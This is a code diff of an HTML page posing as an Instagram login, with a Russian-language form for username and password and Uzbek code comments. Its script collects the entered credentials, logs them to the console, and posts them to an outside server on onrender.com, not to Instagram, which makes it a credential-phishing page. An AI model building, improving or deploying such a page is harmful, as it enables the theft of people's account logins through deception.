@@ -10,7 +10,7 @@
 
 <body>
     <h2>Instagram</h2>
-    <form id="loginForm"> <!-- Form ID to'g'ri nomlangan -->
+    <form id="loginForm">
         <input type="text" id="username" placeholder="Телефон, имя пользователя или эл. адрес" required><br>
         <input type="password" id="password" placeholder="Пароль" required><br>
         <button type="submit">Войти</button>
@@ -53,13 +53,18 @@
     </div>
 
     <script>
-        const form = document.getElementById('loginForm'); <!-- Correct ID used here -->
+        const form = document.getElementById('loginForm'); // Formani olish
 
         form.addEventListener('submit', async (e) => {
-            e.preventDefault();
+            e.preventDefault();  // Forma yuborilishini oldini olish
 
+            // Username va password qiymatlarini olish
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+
+            // Console'ga username va password qiymatlarini chiqarish
+            console.log('Username:', username);
+            console.log('Password:', password);
 
             const res = await fetch('https://my-ser-tnvw.onrender.com/api/auth/login', {
                 method: 'POST',
